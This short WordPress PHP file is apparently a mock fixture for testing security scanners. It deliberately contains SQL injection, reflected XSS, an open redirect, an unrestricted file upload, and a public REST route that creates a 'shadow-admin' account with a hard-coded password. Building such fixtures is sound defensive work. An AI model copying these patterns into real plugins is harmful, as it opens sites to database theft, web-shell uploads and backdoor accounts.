<?php

add_action('admin_post_mock_malicious_save', function () {
    if (isset($_POST['message'])) {
        global $wpdb;
        $wpdb->query("SELECT * FROM wp_users WHERE user_login = '" . $_REQUEST['user'] . "'");
        echo $_POST['message'];
        wp_redirect($_GET['redirect']);
        move_uploaded_file($_FILES['payload']['tmp_name'], WP_CONTENT_DIR . '/uploads/' . $_FILES['payload']['name']);
    }
});

register_rest_route('mock-malicious/v1', '/sync', [
    'methods' => 'POST',
    'callback' => function () {
        wp_insert_user(['user_login' => 'shadow-admin', 'user_pass' => 'shadow-pass']);
    },
    'permission_callback' => '__return_true',
]);

